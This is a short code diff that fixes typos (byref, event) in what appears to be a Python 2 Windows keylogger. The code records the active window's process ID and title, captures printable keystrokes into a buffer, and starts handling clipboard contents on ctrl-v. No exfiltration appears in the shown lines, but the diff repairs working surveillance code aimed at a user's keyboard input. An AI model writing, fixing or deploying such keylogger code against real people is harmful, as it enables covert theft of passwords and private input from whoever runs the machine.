@@ -16,7 +16,7 @@ def get_current_process():
     
     #find the process ID
     pid = c_ulong(0)
-    user32.GetWindowThreadProcessId(hwnd, byrep(pid))
+    user32.GetWindowThreadProcessId(hwnd, byref(pid))
     
     #store the current process ID
     process_id = "%d" %pid.value
@@ -29,7 +29,7 @@ def get_current_process():
     
     #now read its title
     window_title = create_string_buffer("\x00" *512)
-    length = user32.GetWindowTextA(hwnd, byred(window_title), 512)
+    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
     
     #print out the header if we're in the right process
     print
@@ -53,7 +53,7 @@ def KeyStroke(event):
     #if they pressed a standard key
     if event.Ascii > 32 and event.Ascii <127:
         print chr(event.Ascii)
-        key_buffer.append(ecent.Ascii)
+        key_buffer.append(event.Ascii)
         
     else:
         #if ctrl-v, get the value on clipboard
